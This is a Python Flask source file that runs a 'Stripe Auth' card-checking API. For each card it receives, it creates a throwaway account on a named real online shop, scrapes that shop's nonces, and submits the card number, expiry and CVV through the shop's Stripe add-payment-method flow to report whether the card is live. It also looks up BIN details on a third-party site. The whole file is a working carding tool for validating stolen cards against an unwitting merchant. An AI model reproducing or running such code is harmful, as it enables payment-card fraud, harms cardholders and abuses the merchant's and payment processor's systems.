from flask import Flask, request, jsonify
import requests
import re
import random
import string
import time

app = Flask(__name__)

def full_stripe_check(cc, mm, yy, cvv):
    session = requests.Session()
    
    # Realistic browser headers
    session.headers.update({
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
    })

    if len(yy) == 4:
        yy = yy[-2:]

    try:
        print(f"Starting check for card: {cc[:6]}XXXXXX")
        
        # Step 1: Create a temporary user account
        print("Step 1: Creating temporary account...")
        account_url = 'https://shop.wiseacrebrew.com/account/'
        account_resp = session.get(account_url)
        
        # Extract registration nonce
        reg_nonce_match = re.search(r'name="woocommerce-register-nonce" value="([^"]+)"', account_resp.text)
        if not reg_nonce_match:
            return {"status": "Declined", "response": "Cannot access registration page", "decline_type": "process_error"}
        
        reg_nonce = reg_nonce_match.group(1)
        
        # Register a random account
        random_user = ''.join(random.choices(string.ascii_lowercase, k=8))
        random_email = f"{random_user}@gmail.com"
        
        reg_data = {
            'email': random_email,
            'password': 'Test123!@#',
            'woocommerce-register-nonce': reg_nonce,
            '_wp_http_referer': '/account/',
            'register': 'Register'
        }
        
        reg_resp = session.post(account_url, data=reg_data, allow_redirects=False)
        
        if reg_resp.status_code not in [200, 302]:
            return {"status": "Declined", "response": "Account creation failed", "decline_type": "process_error"}
        
        print("Account created successfully")
        time.sleep(1)
        
        # Step 2: Access payment method page
        print("Step 2: Accessing payment page...")
        payment_url = 'https://shop.wiseacrebrew.com/account/add-payment-method/'
        payment_resp = session.get(payment_url)
        
        if payment_resp.status_code != 200:
            return {"status": "Declined", "response": "Cannot access payment page", "decline_type": "process_error"}
        
        # Extract the setup intent nonce
        setup_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"([^"]+)"', payment_resp.text)
        if not setup_nonce_match:
            return {"status": "Declined", "response": "Cannot find payment nonce", "decline_type": "process_error"}
        
        setup_nonce = setup_nonce_match.group(1)
        print(f"Found setup nonce: {setup_nonce}")
        
        # Step 3: Create setup intent first
        print("Step 3: Creating setup intent...")
        intent_headers = {
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://shop.wiseacrebrew.com',
            'referer': payment_url,
            'x-requested-with': 'XMLHttpRequest',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        }
        
        intent_data = {
            'action': 'wc_stripe_create_setup_intent',
            '_ajax_nonce': setup_nonce,
        }
        
        intent_resp = session.post(
            'https://shop.wiseacrebrew.com/?wc-ajax=wc_stripe_create_setup_intent',
            headers=intent_headers,
            data=intent_data
        )
        
        if intent_resp.status_code != 200:
            return {"status": "Declined", "response": "Setup intent creation failed", "decline_type": "process_error"}
        
        intent_data = intent_resp.json()
        if not intent_data.get('success'):
            return {"status": "Declined", "response": "Setup intent failed", "decline_type": "process_error"}
        
        client_secret = intent_data['data']['client_secret']
        print(f"Got client secret: {client_secret}")
        
        # Step 4: Confirm setup intent with card details
        print("Step 4: Confirming setup intent with card...")
        confirm_headers = {
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://shop.wiseacrebrew.com',
            'referer': payment_url,
            'x-requested-with': 'XMLHttpRequest',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        }
        
        confirm_data = {
            'action': 'wc_stripe_confirm_setup_intent',
            'setup_intent': client_secret,
            'payment_method_type': 'card',
            'payment_method_data[type]': 'card',
            'payment_method_data[card][number]': cc,
            'payment_method_data[card][exp_month]': mm,
            'payment_method_data[card][exp_year]': yy,
            'payment_method_data[card][cvc]': cvv,
            'payment_method_data[billing_details][address][country]': 'US',
            'payment_method_data[billing_details][name]': 'Test User',
            '_ajax_nonce': setup_nonce,
        }
        
        confirm_resp = session.post(
            'https://shop.wiseacrebrew.com/?wc-ajax=wc_stripe_confirm_setup_intent',
            headers=confirm_headers,
            data=confirm_data
        )
        
        print(f"Confirm response status: {confirm_resp.status_code}")
        print(f"Confirm response: {confirm_resp.text}")
        
        confirm_data = confirm_resp.json()
        
        if confirm_data.get('success'):
            return {"status": "Approved", "response": "Card verified successfully", "decline_type": "none"}
        else:
            error_msg = confirm_data.get('data', {}).get('error', {}).get('message', 'Card declined')
            if 'declined' in error_msg.lower() or 'invalid' in error_msg.lower():
                return {"status": "Declined", "response": error_msg, "decline_type": "card_decline"}
            else:
                return {"status": "Declined", "response": error_msg, "decline_type": "process_error"}
            
    except Exception as e:
        print(f"Exception: {str(e)}")
        return {"status": "Declined", "response": f"Processing error: {str(e)}", "decline_type": "process_error"}

def get_bin_info(bin_number):
    try:
        response = requests.get(f'https://bins.antipublic.cc/bins/{bin_number}', timeout=10)
        return response.json() if response.status_code == 200 else {}
    except Exception:
        return {}

@app.route('/check', methods=['GET'])
def check_card_endpoint():
    card_str = request.args.get('card')
    
    if not card_str:
        return jsonify({"error": "Please provide card details using the 'card' parameter in the URL."}), 400

    match = re.match(r'(\d{16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})', card_str)
    if not match:
        return jsonify({"error": "Invalid card format. Use CC|MM|YY|CVV."}), 400

    cc, mm, yy, cvv = match.groups()
    
    # Get BIN info first
    bin_info = get_bin_info(cc[:6])
    
    # Process the card check
    check_result = full_stripe_check(cc, mm, yy, cvv)

    final_result = {
        "status": check_result["status"],
        "response": check_result["response"],
        "decline_type": check_result["decline_type"],
        "bin_info": {
            "brand": bin_info.get('brand', 'Unknown'),
            "type": bin_info.get('type', 'Unknown'),
            "country": bin_info.get('country_name', 'Unknown'),
            "country_flag": bin_info.get('country_flag', ''),
            "bank": bin_info.get('bank', 'Unknown'),
        }
    }
    return jsonify(final_result)

@app.route('/')
def home():
    return jsonify({"message": "Stripe Auth API is running!", "status": "active"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
